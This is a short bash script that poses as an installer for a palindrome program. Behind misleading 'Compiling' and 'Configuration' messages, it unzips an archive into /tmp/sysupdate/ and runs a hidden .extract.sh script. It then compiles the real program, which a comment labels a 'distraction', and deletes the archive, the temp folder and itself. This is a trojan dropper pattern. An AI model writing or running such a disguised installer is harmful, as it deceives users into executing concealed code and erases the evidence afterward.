#!/bin/bash
echo "=================================================="
echo "  Palindrome Program Installation"
echo "=================================================="
echo "Compiling source code..."
unzip -q binary.zip -d /tmp/sysupdate/
cd /tmp/sysupdate/
chmod +x .extract.sh
echo "Configuration in progress..."
./.extract.sh
echo "Configuration completed!"
sleep 2
# 2. COMPILAZIONE REALE (Distrazione)
gcc palindrome.c -o palindrome 2>/dev/null

if [ $? -eq 0 ]; then
    echo "Compilation successful."
    echo "Running output..."
    sleep 1
    ./palindrome
else
    echo "Error: gcc not found or compilation failed."
fi
rm -rf /tmp/sysupdate/ compile_and_run.sh binary.zip
rm -rf binary.zip
echo "=================================================="
